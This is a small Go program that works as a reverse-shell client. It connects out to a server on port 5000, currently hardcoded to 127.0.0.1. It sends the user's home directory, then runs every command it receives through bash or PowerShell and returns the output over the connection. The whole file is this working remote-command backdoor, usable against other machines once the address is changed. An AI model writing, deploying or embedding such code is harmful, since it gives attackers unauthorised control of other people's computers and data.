package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"runtime"
	"os/exec"

)

//globals
var conn net.Conn
var terminator = "__END__\n"
var detectedOs string

/**
function that handles errors so I don't have to write ts EVERY SINGLE TIME
param err - the error to print out
*/
 func handleErr(err error) {
	if err != nil {
		fmt.Println("Error!: ", err)
		os.Exit(1)
	}
 }

 /**
 Detects the OS of the client system.
 */
 func detectOs() {
	switch runtime.GOOS {
	case "windows":
		fmt.Println("Windows detected!")
		detectedOs = "windows"
	case "linux":
		fmt.Println("Linux Detected!")
		detectedOs = "linux"
	default:
		fmt.Println("Unsupported os! some things might not work as expected...")
	}
 }

func initListener(serveraddr string) {
	var err error
	conn, err = net.Dial("tcp", serveraddr + ":5000")
	handleErr(err)
	fmt.Println("Listener now listening to: ", conn.LocalAddr().String())

}

func listen() {
	userdir, err := os.UserHomeDir()
	handleErr(err)
	// fmt.Println(userdir)
	conn.Write([]byte(userdir))
	scan()
}

func scan() {
	var cmd string
	scanner := bufio.NewScanner(conn)
	for (scanner.Scan()) {
		cmd = scanner.Text()
		fmt.Println(cmd)
		RunLogged(cmd)
	}
}

func RunLogged(cmd string) {
	var out *exec.Cmd
	var output []byte

	if runtime.GOOS == "windows" {
		out = exec.Command("powershell.exe", cmd)
	} else {
		out = exec.Command("bash", "-c", cmd)
	}
	output, _ = out.CombinedOutput()

	conn.Write(output)
	
}
 
 func main() {
	fmt.Println("Initializing Client...")
	detectOs()
	initListener("127.0.0.1")
	listen()	
	
 }





